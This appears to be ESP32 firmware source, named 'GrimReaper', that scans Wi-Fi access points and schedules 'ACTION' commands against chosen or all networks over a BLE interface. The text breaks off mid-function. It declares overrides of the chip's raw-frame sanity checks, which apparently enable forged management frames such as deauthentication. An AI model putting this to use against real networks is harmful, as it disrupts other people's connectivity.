#include <Arduino.h>
#include <WiFi.h>
#include <NimBLEDevice.h>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdio>
#include <cstring>
#include <Preferences.h>
#include <time.h>
#include <sys/time.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

extern "C" {
  int wdev_is_valid_raw_tx_frame(void* wdev, uint8_t* frame, size_t len);
  int ieee80211_raw_frame_sanity_check(void* aux, uint8_t* frame, size_t len);
}

#define BLE_NAME "GrimReaper"

#define NUS_SERVICE_UUID "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define NUS_RX_UUID      "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
#define NUS_TX_UUID      "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"

static constexpr uint32_t PASSIVE_DWELL_MS = 150;
static constexpr uint16_t MAX_COMMAND_LENGTH = 160;
static constexpr int16_t WIFI_SCAN_RUNNING_CODE = -1;
static constexpr int16_t WIFI_SCAN_FAILED_CODE = -2;
static constexpr size_t MAX_NOTIFY_DATA = 244; 
static constexpr size_t FRAME_HEADER_LENGTH = 8;
static constexpr size_t MAX_SAVED_APS = 100;

struct APRecord {
  String ssid;
  String bssid;
  int32_t rssi;
  int32_t channel;
  int32_t frequencyMhz;
  String band;
  String security;
  bool hidden;
  int authCode;
};

std::vector<APRecord> lastScanRecords;

NimBLEServer* bleServer = nullptr;
NimBLECharacteristic* txCharacteristic = nullptr;
QueueHandle_t commandQueue = nullptr;

volatile bool bleReady = false;
volatile bool txNotificationsEnabled = false;
volatile bool txAbortRequested = false;
volatile bool actionPauseRequested = false;
volatile bool actionYieldRequested = false;
volatile bool schedulerPauseAllRequested = false;
volatile bool actionActive = false;
// A network-save transaction temporarily pauses Action dispatch and, when
// needed, cooperatively pauses the current runner without stopping it.
volatile bool networkSavePauseActive = false;
volatile bool networkSavePauseOwnedAction = false;
volatile bool networkSavePauseAckSent = false;
uint32_t networkSavePauseStartedMs = 0;
TaskHandle_t actionTaskHandle = nullptr;

bool wifiInitialized = false;
bool wifiScanActive = false;
// A Wi-Fi scan temporarily takes the Action runner offline. The active
// Action is yielded onto the existing LIFO interruption stack and resumed
// after scanning and due-schedule dispatch have completed.
bool wifiScanPauseActive = false;
bool wifiScanStartPending = false;
uint8_t outgoingMessageId = 0;
Preferences savedPreferences;
Preferences schedulerPreferences;

// Scheduler storage is independent of the existing "wifi-aps" namespace.
// Stage 6 uses a new key so the Stage 5 "records" blob is left untouched.
static constexpr uint16_t SCHEDULER_STORAGE_VERSION = 2;
static constexpr uint8_t MAX_SCHEDULES = 10;
static constexpr char SCHEDULER_RECORDS_KEY[] = "records_v2";

enum ScheduleType : uint8_t {
  SCHEDULE_ONE_TIME = 0,
  SCHEDULE_RECURRING = 1
};

enum ScheduledActionType : uint8_t {
  SCHEDULE_ACTION_ALL = 0,
  SCHEDULE_ACTION_INDIVIDUAL = 1
};

enum ScheduleDurationMode : uint8_t {
  SCHEDULE_ACTIVE_DURATION = 0,
  SCHEDULE_FIXED_END_TIME = 1
};

struct ScheduleRecord {
  uint16_t id;
  uint8_t scheduleType;          // One-time or recurring.
  uint8_t actionType;            // ACTION_ALL or individual ACTION.
  char targetBssid[18];          // Empty for Action All; otherwise XX:XX:XX:XX:XX:XX.

  // Selected local start date/time, using the phone's timezone.
  // For one-time schedules, startAtUtc is the authoritative UTC instant.
  // For recurring schedules, these local calendar fields anchor the recurrence.
  uint16_t startYear;
  uint8_t startMonth;
  uint8_t startDay;
  uint8_t startHour;
  uint8_t startMinute;
  uint8_t weekdays;              // Bit 0=Sunday ... bit 6=Saturday.
  uint32_t startAtUtc;            // UTC Unix seconds for the selected first start.

  uint8_t durationMode;           // Active duration or fixed end time.
  uint32_t totalDurationSeconds;  // 0 = unlimited; valid only for active-duration mode.
  uint32_t fixedEndAtUtc;         // One-time fixed deadline, UTC Unix seconds.
  uint8_t fixedEndDayOffset;      // Recurring fixed end: local days after occurrence start.
  uint8_t fixedEndHour;           // Recurring fixed end local hour (0-23).
  uint8_t fixedEndMinute;         // Recurring fixed end local minute (0-59).

  uint32_t executionDurationSeconds; // 0 = unlimited execution cycle.
  uint32_t pauseIntervalSeconds;    // 0 = no pause between cycles.
  bool enabled;
};


// Stage 8C: RAM model for a running or interrupted scheduled Action.
// This is deliberately separate from ScheduleRecord: a saved schedule is
// configuration, while an ActionInstance is one execution of that schedule.
static constexpr uint8_t MAX_ACTION_INSTANCES = 10;

enum ActionInstanceState : uint8_t {
  ACTION_INSTANCE_EMPTY = 0,
  ACTION_INSTANCE_RUNNING = 1,
  ACTION_INSTANCE_PAUSED = 2,
  ACTION_INSTANCE_PENDING = 3,
  ACTION_INSTANCE_PAUSE_REQUESTED = 4
};

struct ActionInstance {
  uint32_t instanceId;
  uint16_t scheduleId;
  uint8_t actionType;
  char targetBssid[18];
  char command[MAX_COMMAND_LENGTH];
  uint8_t state;
  uint32_t remainingTotalActiveSeconds;
  uint32_t remainingExecutionSeconds;
  uint32_t remainingPauseSeconds;
  uint32_t cycleNumber;
  uint32_t fixedEndAtUtc;
  uint32_t dueAtUtc;
  uint8_t durationMode;
  uint8_t timingPhase;
  uint32_t executionDurationSeconds;
  uint32_t pauseIntervalSeconds;
  // Stage 8I: runtime clock fields. Manual Actions leave timingConfigured false.
  bool timingConfigured;
  uint32_t lastTimingUpdateMs;
};

// Stage 8F: isolated timing model used to verify scheduler duration semantics.
// This model is not connected to the live Action task yet.
enum ActionTimingPhase : uint8_t {
  ACTION_TIMING_ACTIVE = 0,
  ACTION_TIMING_PAUSE = 1,
  ACTION_TIMING_FINISHED = 2
};

struct ActionTimingState {
  uint8_t durationMode;
  uint8_t phase;
  uint32_t remainingTotalActiveSeconds; // 0 = unlimited in Active Duration mode.
  uint32_t executionDurationSeconds;    // 0 = one unlimited execution cycle.
  uint32_t remainingExecutionSeconds;
  uint32_t pauseIntervalSeconds;
  uint32_t remainingPauseSeconds;
  uint32_t fixedEndAtUtc;               // Used only by Fixed End Time mode.
};

// Stage 8G: copy the complete timing state into an ActionInstance so it can
// be preserved when an Action is paused or moved onto the interruption stack.
void saveActionTimingToInstance(const ActionTimingState& timing,
                                ActionInstance& instance) {
  instance.durationMode = timing.durationMode;
  instance.timingPhase = timing.phase;
  instance.remainingTotalActiveSeconds = timing.remainingTotalActiveSeconds;
  instance.executionDurationSeconds = timing.executionDurationSeconds;
  instance.remainingExecutionSeconds = timing.remainingExecutionSeconds;
  instance.pauseIntervalSeconds = timing.pauseIntervalSeconds;
  instance.remainingPauseSeconds = timing.remainingPauseSeconds;
  instance.fixedEndAtUtc = timing.fixedEndAtUtc;
}

// Restore the timing model exactly as it was when the Action was paused.
void restoreActionTimingFromInstance(const ActionInstance& instance,
                                     ActionTimingState& timing) {
  timing.durationMode = instance.durationMode;
  timing.phase = instance.timingPhase;
  timing.remainingTotalActiveSeconds = instance.remainingTotalActiveSeconds;
  timing.executionDurationSeconds = instance.executionDurationSeconds;
  timing.remainingExecutionSeconds = instance.remainingExecutionSeconds;
  timing.pauseIntervalSeconds = instance.pauseIntervalSeconds;
  timing.remainingPauseSeconds = instance.remainingPauseSeconds;
  timing.fixedEndAtUtc = instance.fixedEndAtUtc;
}

bool advanceActionTiming(ActionTimingState& state, uint32_t elapsedSeconds,
                         uint32_t nowUtc);

// Stage 8H: advance the timing values stored in an ActionInstance and
// write the updated values back. This keeps the instance as the source of
// truth while it is running or paused.
bool advanceActionInstanceTiming(ActionInstance& instance,
                                 uint32_t elapsedSeconds,
                                 uint32_t nowUtc) {
  if (instance.state == ACTION_INSTANCE_EMPTY ||
      instance.timingPhase == ACTION_TIMING_FINISHED) {
    return true;
  }

  ActionTimingState timing = {};
  restoreActionTimingFromInstance(instance, timing);
  const bool finished = advanceActionTiming(timing, elapsedSeconds, nowUtc);
  saveActionTimingToInstance(timing, instance);
  if (finished) instance.state = ACTION_INSTANCE_EMPTY;
  return finished;
}

// Advances a timing state by elapsed whole seconds. The caller supplies the
// current UTC time so Fixed End Time can expire independently of pause state.
bool advanceActionTiming(ActionTimingState& state, uint32_t elapsedSeconds,
                         uint32_t nowUtc) {
  if (state.phase == ACTION_TIMING_FINISHED) return true;

  if (state.durationMode == SCHEDULE_FIXED_END_TIME) {
    if (state.fixedEndAtUtc == 0 || nowUtc >= state.fixedEndAtUtc) {
      state.phase = ACTION_TIMING_FINISHED;
      return true;
    }
    return false;
  }

  if (state.durationMode != SCHEDULE_ACTIVE_DURATION) {
    state.phase = ACTION_TIMING_FINISHED;
    return true;
  }

  while (elapsedSeconds > 0 && state.phase != ACTION_TIMING_FINISHED) {
    if (state.phase == ACTION_TIMING_PAUSE) {
      if (state.remainingPauseSeconds == 0) {
        state.phase = ACTION_TIMING_ACTIVE;
        state.remainingExecutionSeconds = state.executionDurationSeconds;
        continue;
      }

      const uint32_t consumed = (elapsedSeconds < state.remainingPauseSeconds)
          ? elapsedSeconds : state.remainingPauseSeconds;
      elapsedSeconds -= consumed;
      state.remainingPauseSeconds -= consumed;
      if (state.remainingPauseSeconds == 0) {
        state.phase = ACTION_TIMING_ACTIVE;
        state.remainingExecutionSeconds = state.executionDurationSeconds;
      }
      continue;
    }

    if (state.phase != ACTION_TIMING_ACTIVE) break;
    if (state.remainingTotalActiveSeconds == 0 &&
        state.executionDurationSeconds != 0 &&
        state.remainingExecutionSeconds == 0) {
      // A finite execution cycle has ended while total duration is unlimited.
      if (state.pauseIntervalSeconds > 0) {
        state.phase = ACTION_TIMING_PAUSE;
        state.remainingPauseSeconds = state.pauseIntervalSeconds;
      } else {
        state.remainingExecutionSeconds = state.executionDurationSeconds;
      }
      continue;
    }

    uint32_t consumed = elapsedSeconds;
    if (state.remainingTotalActiveSeconds > 0 &&
        consumed > state.remainingTotalActiveSeconds) {
      consumed = state.remainingTotalActiveSeconds;
    }
    if (state.executionDurationSeconds > 0 &&
        consumed > state.remainingExecutionSeconds) {
      consumed = state.remainingExecutionSeconds;
    }

    if (consumed == 0) {
      if (state.remainingTotalActiveSeconds == 0) {
        state.phase = ACTION_TIMING_FINISHED;
      } else if (state.executionDurationSeconds > 0 &&
                 state.remainingExecutionSeconds == 0) {
        if (state.pauseIntervalSeconds > 0) {
          state.phase = ACTION_TIMING_PAUSE;
          state.remainingPauseSeconds = state.pauseIntervalSeconds;
        } else {
          state.remainingExecutionSeconds = state.executionDurationSeconds;
        }
      } else {
        break;
      }
      continue;
    }

    elapsedSeconds -= consumed;
    if (state.remainingTotalActiveSeconds > 0) {
      state.remainingTotalActiveSeconds -= consumed;
      if (state.remainingTotalActiveSeconds == 0) {
        state.phase = ACTION_TIMING_FINISHED;
        continue;
      }
    }
    if (state.executionDurationSeconds > 0) {
      state.remainingExecutionSeconds -= consumed;
      if (state.remainingExecutionSeconds == 0) {
        if (state.pauseIntervalSeconds > 0) {
          state.phase = ACTION_TIMING_PAUSE;
          state.remainingPauseSeconds = state.pauseIntervalSeconds;
        } else {
          state.remainingExecutionSeconds = state.executionDurationSeconds;
        }
      }
    }
  }

  return state.phase == ACTION_TIMING_FINISHED;
}

void sendSimpleResponse(const char* text);

void testActionTimingSemantics() {
  bool passed = true;

  // Ten seconds of Active Duration must consume only active time, not pauses.
  ActionTimingState active = {};
  active.durationMode = SCHEDULE_ACTIVE_DURATION;
  active.phase = ACTION_TIMING_ACTIVE;
  active.remainingTotalActiveSeconds = 10;
  active.executionDurationSeconds = 3;
  active.remainingExecutionSeconds = 3;
  active.pauseIntervalSeconds = 2;

  if (advanceActionTiming(active, 3, 1003) ||
      active.remainingTotalActiveSeconds != 7 ||
      active.phase != ACTION_TIMING_PAUSE ||
      active.remainingPauseSeconds != 2) passed = false;
  if (advanceActionTiming(active, 2, 1005) ||
      active.phase != ACTION_TIMING_ACTIVE ||
      active.remainingExecutionSeconds != 3) passed = false;
  if (advanceActionTiming(active, 3, 1008) ||
      active.remainingTotalActiveSeconds != 4 ||
      active.phase != ACTION_TIMING_PAUSE) passed = false;
  if (advanceActionTiming(active, 2, 1010) ||
      active.phase != ACTION_TIMING_ACTIVE) passed = false;
  if (advanceActionTiming(active, 3, 1013) ||
      active.remainingTotalActiveSeconds != 1 ||
      active.phase != ACTION_TIMING_PAUSE) passed = false;
  if (advanceActionTiming(active, 2, 1015) ||
      active.phase != ACTION_TIMING_ACTIVE) passed = false;
  if (!advanceActionTiming(active, 1, 1016) ||
      active.phase != ACTION_TIMING_FINISHED) passed = false;

  // Fixed End Time must expire at the deadline regardless of elapsed/pause state.
  ActionTimingState fixed = {};
  fixed.durationMode = SCHEDULE_FIXED_END_TIME;
  fixed.phase = ACTION_TIMING_PAUSE;
  fixed.remainingPauseSeconds = 300;
  fixed.fixedEndAtUtc = 5000;
  if (!advanceActionTiming(fixed, 0, 5000) ||
      fixed.phase != ACTION_TIMING_FINISHED) passed = false;

  // Unlimited total duration and unlimited execution duration stay active.
  ActionTimingState unlimited = {};
  unlimited.durationMode = SCHEDULE_ACTIVE_DURATION;
  unlimited.phase = ACTION_TIMING_ACTIVE;
  unlimited.remainingTotalActiveSeconds = 0;
  unlimited.executionDurationSeconds = 0;
  unlimited.remainingExecutionSeconds = 0;
  unlimited.pauseIntervalSeconds = 15;
  if (advanceActionTiming(unlimited, 3600, 8600) ||
      unlimited.phase != ACTION_TIMING_ACTIVE) passed = false;

  if (passed) {
    Serial.println("[Scheduler] Stage 8F timing semantics test PASSED.");
    sendSimpleResponse("SCHED_TIMING_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8F timing semantics test FAILED.");
    sendSimpleResponse("SCHED_TIMING_TEST:FAILED");
  }
}


// LIFO interruption stack: the last paused Action is resumed first.
ActionInstance interruptedActionStack[MAX_ACTION_INSTANCES] = {};
uint8_t interruptedActionCount = 0;
uint32_t nextActionInstanceId = 1;
// Stage 8E: identity and state of the currently executing Action.
// scheduleId == 0 identifies a manually started Action rather than a schedule.
ActionInstance activeActionInstance = {};
// A manual Action may interrupt a scheduled foreground Action. The command is
// started by loop() after the scheduled runner has saved itself on the LIFO stack.
char pendingManualActionCommand[MAX_COMMAND_LENGTH] = {0};
volatile bool pendingManualActionStart = false;

// Stage 8K: due occurrences wait here until the runner is ready to start them.
// The queue is ordered by dueAtUtc, then scheduleId, for deterministic ties.
static constexpr uint8_t MAX_PENDING_SCHEDULED_ACTIONS = MAX_ACTION_INSTANCES;
ActionInstance pendingScheduledActions[MAX_PENDING_SCHEDULED_ACTIONS] = {};
uint8_t pendingScheduledActionCount = 0;

struct SchedulerStorage {
  uint16_t version;
  uint8_t count;
  uint16_t nextId;
  ScheduleRecord records[MAX_SCHEDULES];
};

SchedulerStorage schedulerData = {};

// Stage 8V: persist the most recently queued occurrence for each recurring
// schedule separately, so the Stage 6 ScheduleRecord layout remains unchanged.
static constexpr uint16_t RECUR_RUN_STORAGE_VERSION = 1;
static constexpr char RECUR_RUN_STORAGE_KEY[] = "recur_runs";
struct RecurringRunEntry {
  uint16_t scheduleId;
  uint32_t lastDueAtUtc;
};
struct RecurringRunStorage {
  uint16_t version;
  RecurringRunEntry entries[MAX_SCHEDULES];
};
RecurringRunStorage recurringRunData = {};

// Explicit declarations are required here because the Arduino IDE's automatic
// prototype generation can place declarations after these early call sites.
void sendSimpleResponse(const char* text);
bool saveSchedulerStorage();
bool startScheduledActionTask(const ActionInstance& scheduledInstance);
bool resumeMostRecentInterruptedAction(uint32_t nowUtc);
bool startResumedActionTask(const ActionInstance& pausedInstance);

// Stage 8J: construct a pending ActionInstance from a saved schedule.
// For recurring Fixed End Time schedules, the caller supplies the occurrence's
// already-resolved UTC deadline. Timezone/DST resolution is handled separately.
bool initializeScheduledActionInstance(const ScheduleRecord& schedule,
                                       uint32_t occurrenceStartUtc,
                                       uint32_t resolvedFixedEndUtc,
                                       ActionInstance& instance) {
  if (schedule.id == 0 || occurrenceStartUtc == 0 ||
      (schedule.actionType != SCHEDULE_ACTION_ALL &&
       schedule.actionType != SCHEDULE_ACTION_INDIVIDUAL) ||
      (schedule.durationMode != SCHEDULE_ACTIVE_DURATION &&
       schedule.durationMode != SCHEDULE_FIXED_END_TIME)) {
    return false;
  }

  if (schedule.actionType == SCHEDULE_ACTION_INDIVIDUAL &&
      strlen(schedule.targetBssid) != 17) return false;

  const uint32_t fixedEndUtc =
      schedule.scheduleType == SCHEDULE_ONE_TIME
          ? schedule.fixedEndAtUtc : resolvedFixedEndUtc;
  if (schedule.durationMode == SCHEDULE_FIXED_END_TIME &&
      (fixedEndUtc == 0 || fixedEndUtc <= occurrenceStartUtc)) return false;

  memset(&instance, 0, sizeof(instance));
  instance.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  instance.scheduleId = schedule.id;
  instance.actionType = schedule.actionType;
  instance.state = ACTION_INSTANCE_PENDING;
  instance.dueAtUtc = occurrenceStartUtc;
  instance.durationMode = schedule.durationMode;
  instance.executionDurationSeconds = schedule.executionDurationSeconds;
  instance.remainingExecutionSeconds = schedule.executionDurationSeconds;
  instance.pauseIntervalSeconds = schedule.pauseIntervalSeconds;
  instance.remainingPauseSeconds = 0;
  instance.remainingTotalActiveSeconds =
      schedule.durationMode == SCHEDULE_ACTIVE_DURATION
          ? schedule.totalDurationSeconds : 0;
  instance.fixedEndAtUtc = fixedEndUtc;
  instance.timingPhase = ACTION_TIMING_ACTIVE;
  instance.timingConfigured = true;
  instance.lastTimingUpdateMs = 0;

  if (schedule.actionType == SCHEDULE_ACTION_ALL) {
    strncpy(instance.command, "ACTION_ALL", sizeof(instance.command) - 1);
  } else {
    snprintf(instance.command, sizeof(instance.command), "ACTION:%s",
             schedule.targetBssid);
    strncpy(instance.targetBssid, schedule.targetBssid,
            sizeof(instance.targetBssid) - 1);
  }
  return true;
}

// Stage 8K: enqueue a due occurrence without launching it. Duplicate
// schedule/occurrence pairs are rejected so polling cannot create duplicates.
bool enqueuePendingScheduledAction(const ActionInstance& instance) {
  if (instance.state != ACTION_INSTANCE_PENDING || instance.scheduleId == 0 ||
      instance.dueAtUtc == 0 ||
      pendingScheduledActionCount >= MAX_PENDING_SCHEDULED_ACTIONS) {
    return false;
  }

  for (uint8_t i = 0; i < pendingScheduledActionCount; ++i) {
    const ActionInstance& queued = pendingScheduledActions[i];
    if (queued.scheduleId == instance.scheduleId &&
        queued.dueAtUtc == instance.dueAtUtc) {
      return false;
    }
  }

  uint8_t insertAt = pendingScheduledActionCount;
  while (insertAt > 0) {
    const ActionInstance& previous = pendingScheduledActions[insertAt - 1];
    const bool comesBefore = instance.dueAtUtc < previous.dueAtUtc ||
        (instance.dueAtUtc == previous.dueAtUtc &&
         instance.scheduleId < previous.scheduleId);
    if (!comesBefore) break;
    pendingScheduledActions[insertAt] = previous;
    --insertAt;
  }
  pendingScheduledActions[insertAt] = instance;
  pendingScheduledActionCount++;
  return true;
}

// Retrieve the earliest due occurrence. Fixed End Time entries that have
// already expired while queued are discarded instead of being launched.
bool takeNextPendingScheduledAction(uint32_t nowUtc, ActionInstance& instance) {
  while (pendingScheduledActionCount > 0) {
    // A future occurrence remains queued until its due time arrives.
    if (pendingScheduledActions[0].dueAtUtc > nowUtc) return false;
    ActionInstance next = pendingScheduledActions[0];
    for (uint8_t i = 0; i + 1 < pendingScheduledActionCount; ++i) {
      pendingScheduledActions[i] = pendingScheduledActions[i + 1];
    }
    pendingScheduledActionCount--;
    memset(&pendingScheduledActions[pendingScheduledActionCount], 0,
           sizeof(ActionInstance));

    if (next.durationMode == SCHEDULE_FIXED_END_TIME &&
        (next.fixedEndAtUtc == 0 || nowUtc >= next.fixedEndAtUtc)) {
      continue;
    }
    instance = next;
    return true;
  }
  return false;
}

void clearPendingScheduledActions() {
  memset(pendingScheduledActions, 0, sizeof(pendingScheduledActions));
  pendingScheduledActionCount = 0;
}


// Stage 8R: discard every saved Action instance without touching the saved
// schedule configurations in schedulerData / Flash.
void clearAllActionInstances() {
  memset(interruptedActionStack, 0, sizeof(interruptedActionStack));
  interruptedActionCount = 0;
  clearPendingScheduledActions();
}


// The clock must be synchronized again after every ESP32 reboot.
bool timeSynced = false;

// Stage 8V: recurring occurrence tracking uses its own Preferences key. This
// avoids changing the persisted Stage 6 ScheduleRecord binary layout.
bool saveRecurringRunStorage() {
  recurringRunData.version = RECUR_RUN_STORAGE_VERSION;
  return schedulerPreferences.putBytes(RECUR_RUN_STORAGE_KEY, &recurringRunData,
                                       sizeof(recurringRunData)) == sizeof(recurringRunData);
}

bool loadRecurringRunStorage() {
  const size_t storedLength = schedulerPreferences.getBytesLength(RECUR_RUN_STORAGE_KEY);
  if (storedLength == 0) {
    memset(&recurringRunData, 0, sizeof(recurringRunData));
    recurringRunData.version = RECUR_RUN_STORAGE_VERSION;
    return saveRecurringRunStorage();
  }
  if (storedLength != sizeof(recurringRunData) ||
      schedulerPreferences.getBytes(RECUR_RUN_STORAGE_KEY, &recurringRunData,
                                    sizeof(recurringRunData)) != sizeof(recurringRunData) ||
      recurringRunData.version != RECUR_RUN_STORAGE_VERSION) {
    memset(&recurringRunData, 0, sizeof(recurringRunData));
    recurringRunData.version = RECUR_RUN_STORAGE_VERSION;
    return saveRecurringRunStorage();
  }
  return true;
}

uint32_t lastQueuedRecurringOccurrence(uint16_t scheduleId) {
  for (uint8_t i = 0; i < MAX_SCHEDULES; ++i) {
    if (recurringRunData.entries[i].scheduleId == scheduleId) {
      return recurringRunData.entries[i].lastDueAtUtc;
    }
  }
  return 0;
}

bool rememberRecurringOccurrence(uint16_t scheduleId, uint32_t dueAtUtc) {
  if (scheduleId == 0 || dueAtUtc == 0) return false;
  int slot = -1;
  for (uint8_t i = 0; i < MAX_SCHEDULES; ++i) {
    if (recurringRunData.entries[i].scheduleId == scheduleId) {
      slot = static_cast<int>(i);
      break;
    }
    if (slot < 0 && recurringRunData.entries[i].scheduleId == 0) {
      slot = static_cast<int>(i);
    }
  }
  // Reuse history slots belonging to schedules that have since been deleted.
  if (slot < 0) {
    for (uint8_t i = 0; i < MAX_SCHEDULES; ++i) {
      bool stillExists = false;
      for (uint8_t j = 0; j < schedulerData.count; ++j) {
        if (schedulerData.records[j].id == recurringRunData.entries[i].scheduleId) {
          stillExists = true;
          break;
        }
      }
      if (!stillExists) {
        slot = static_cast<int>(i);
        break;
      }
    }
  }
  if (slot < 0) return false;

  const RecurringRunStorage previous = recurringRunData;
  recurringRunData.entries[slot].scheduleId = scheduleId;
  recurringRunData.entries[slot].lastDueAtUtc = dueAtUtc;
  if (!saveRecurringRunStorage()) {
    recurringRunData = previous;
    return false;
  }
  return true;
}

// Find the most recent matching local calendar occurrence. The selected start
// date anchors the recurrence; weekday bits use Sunday=bit 0 through Saturday=bit 6.
bool resolveRecurringOccurrenceStartUtc(const ScheduleRecord& schedule,
                                         uint32_t nowUtc,
                                         uint32_t& occurrenceStartUtc) {
  occurrenceStartUtc = 0;
  if (schedule.scheduleType != SCHEDULE_RECURRING || schedule.weekdays == 0 ||
      schedule.startAtUtc == 0 || nowUtc == 0 ||
      schedule.startHour > 23 || schedule.startMinute > 59) return false;

  struct tm currentLocal = {};
  const time_t nowValue = static_cast<time_t>(nowUtc);
  if (localtime_r(&nowValue, &currentLocal) == nullptr) return false;

  for (int daysBack = 0; daysBack <= 7; ++daysBack) {
    struct tm candidateDate = currentLocal;
    candidateDate.tm_hour = 12;
    candidateDate.tm_min = 0;
    candidateDate.tm_sec = 0;
    candidateDate.tm_mday -= daysBack;
    candidateDate.tm_isdst = -1;
    const time_t normalizedDate = mktime(&candidateDate);
    if (normalizedDate == static_cast<time_t>(-1)) return false;

    struct tm localDate = {};
    if (localtime_r(&normalizedDate, &localDate) == nullptr) return false;

    const bool beforeAnchor =
        (localDate.tm_year + 1900) < schedule.startYear ||
        ((localDate.tm_year + 1900) == schedule.startYear &&
         (localDate.tm_mon + 1) < schedule.startMonth) ||
        ((localDate.tm_year + 1900) == schedule.startYear &&
         (localDate.tm_mon + 1) == schedule.startMonth &&
         localDate.tm_mday < schedule.startDay);
    if (beforeAnchor) return false;

    if ((schedule.weekdays & (1U << localDate.tm_wday)) == 0) continue;

    uint32_t dueUtc = 0;
    const bool isAnchorDate =
        (localDate.tm_year + 1900) == schedule.startYear &&
        (localDate.tm_mon + 1) == schedule.startMonth &&
        localDate.tm_mday == schedule.startDay;
    if (isAnchorDate) {
      // Keep the phone-generated first occurrence as the authoritative instant.
      dueUtc = schedule.startAtUtc;
    } else {
      localDate.tm_hour = schedule.startHour;
      localDate.tm_min = schedule.startMinute;
      localDate.tm_sec = 0;
      localDate.tm_isdst = -1;
      const time_t dueValue = mktime(&localDate);
      if (dueValue == static_cast<time_t>(-1) || dueValue <= 0) return false;
      dueUtc = static_cast<uint32_t>(dueValue);
    }

    // If today's occurrence is still in the future, do not replay yesterday's
    // occurrence just because the selected weekday mask also included it.
    if (dueUtc > nowUtc) return false;
    occurrenceStartUtc = dueUtc;
    return true;
  }
  return false;
}

// Resolve a recurring Fixed End Time using local calendar arithmetic, not a
// fixed UTC offset. This preserves the selected wall-clock deadline across DST.
bool resolveRecurringFixedEndUtc(const ScheduleRecord& schedule,
                                 uint32_t occurrenceStartUtc,
                                 uint32_t& fixedEndUtc) {
  fixedEndUtc = 0;
  if (occurrenceStartUtc == 0 || schedule.fixedEndHour > 23 ||
      schedule.fixedEndMinute > 59) return false;

  const time_t occurrenceValue = static_cast<time_t>(occurrenceStartUtc);
  struct tm localEnd = {};
  if (localtime_r(&occurrenceValue, &localEnd) == nullptr) return false;
  localEnd.tm_mday += schedule.fixedEndDayOffset;
  localEnd.tm_hour = schedule.fixedEndHour;
  localEnd.tm_min = schedule.fixedEndMinute;
  localEnd.tm_sec = 0;
  localEnd.tm_isdst = -1;
  const time_t endValue = mktime(&localEnd);
  if (endValue == static_cast<time_t>(-1) || endValue <= occurrenceValue) return false;
  fixedEndUtc = static_cast<uint32_t>(endValue);
  return true;
}

// Stage 8L + 8V: detect due one-time and recurring schedules. A recurring
// occurrence is remembered in Flash when queued, preventing duplicate launches
// after polling or a device reboot. If the device missed several weeks, only
// the latest matching occurrence is considered for catch-up.
bool pendingOrActiveOccurrenceExists(uint16_t scheduleId, uint32_t dueAtUtc) {
  if (activeActionInstance.scheduleId == scheduleId &&
      activeActionInstance.dueAtUtc == dueAtUtc &&
      activeActionInstance.state != ACTION_INSTANCE_EMPTY) return true;

  for (uint8_t i = 0; i < interruptedActionCount; ++i) {
    const ActionInstance& stacked = interruptedActionStack[i];
    if (stacked.scheduleId == scheduleId && stacked.dueAtUtc == dueAtUtc) {
      return true;
    }
  }

  for (uint8_t i = 0; i < pendingScheduledActionCount; ++i) {
    const ActionInstance& queued = pendingScheduledActions[i];
    if (queued.scheduleId == scheduleId && queued.dueAtUtc == dueAtUtc) {
      return true;
    }
  }
  return false;
}

uint8_t collectDueOneTimeSchedules(uint32_t nowUtc) {
  if (nowUtc == 0 || schedulerData.count > MAX_SCHEDULES) return 0;

  uint8_t queuedCount = 0;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    const ScheduleRecord& schedule = schedulerData.records[i];
    if (!schedule.enabled || schedule.scheduleType != SCHEDULE_ONE_TIME ||
        schedule.startAtUtc == 0 || schedule.startAtUtc > nowUtc) continue;
    if (pendingOrActiveOccurrenceExists(schedule.id, schedule.startAtUtc)) continue;
    if (schedule.durationMode == SCHEDULE_FIXED_END_TIME &&
        (schedule.fixedEndAtUtc == 0 || nowUtc >= schedule.fixedEndAtUtc)) continue;

    ActionInstance instance = {};
    if (!initializeScheduledActionInstance(schedule, schedule.startAtUtc,
                                           schedule.fixedEndAtUtc, instance)) continue;
    if (enqueuePendingScheduledAction(instance)) queuedCount++;
  }
  return queuedCount;
}

uint8_t collectDueRecurringSchedules(uint32_t nowUtc) {
  if (nowUtc == 0 || schedulerData.count > MAX_SCHEDULES ||
      schedulerPreferences.getString("tzrule", "").isEmpty()) return 0;

  uint8_t queuedCount = 0;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    const ScheduleRecord& schedule = schedulerData.records[i];
    if (!schedule.enabled || schedule.scheduleType != SCHEDULE_RECURRING) continue;

    uint32_t occurrenceStartUtc = 0;
    if (!resolveRecurringOccurrenceStartUtc(schedule, nowUtc, occurrenceStartUtc) ||
        occurrenceStartUtc <= lastQueuedRecurringOccurrence(schedule.id) ||
        pendingOrActiveOccurrenceExists(schedule.id, occurrenceStartUtc)) continue;

    uint32_t resolvedEndUtc = 0;
    if (schedule.durationMode == SCHEDULE_FIXED_END_TIME &&
        !resolveRecurringFixedEndUtc(schedule, occurrenceStartUtc, resolvedEndUtc)) {
      Serial.printf("[Scheduler] Could not resolve Fixed End Time for recurring schedule %u.\n",
                    static_cast<unsigned int>(schedule.id));
      continue;
    }

    // Expired Fixed End Time occurrences are recorded as handled, not queued.
    if (schedule.durationMode == SCHEDULE_FIXED_END_TIME && nowUtc >= resolvedEndUtc) {
      if (!rememberRecurringOccurrence(schedule.id, occurrenceStartUtc)) {
        Serial.printf("[Scheduler] Could not persist expired occurrence for schedule %u.\n",
                      static_cast<unsigned int>(schedule.id));
      }
      continue;
    }

    ActionInstance instance = {};
    if (!initializeScheduledActionInstance(schedule, occurrenceStartUtc,
                                           resolvedEndUtc, instance)) continue;
    if (!enqueuePendingScheduledAction(instance)) continue;

    if (!rememberRecurringOccurrence(schedule.id, occurrenceStartUtc)) {
      Serial.printf("[Scheduler] WARNING: Recurring occurrence %lu for schedule %u is queued, but its duplicate guard could not be saved.\n",
                    static_cast<unsigned long>(occurrenceStartUtc),
                    static_cast<unsigned int>(schedule.id));
    }
    queuedCount++;
    Serial.printf("[Scheduler] Queued recurring occurrence for schedule %u at UTC %lu.\n",
                  static_cast<unsigned int>(schedule.id),
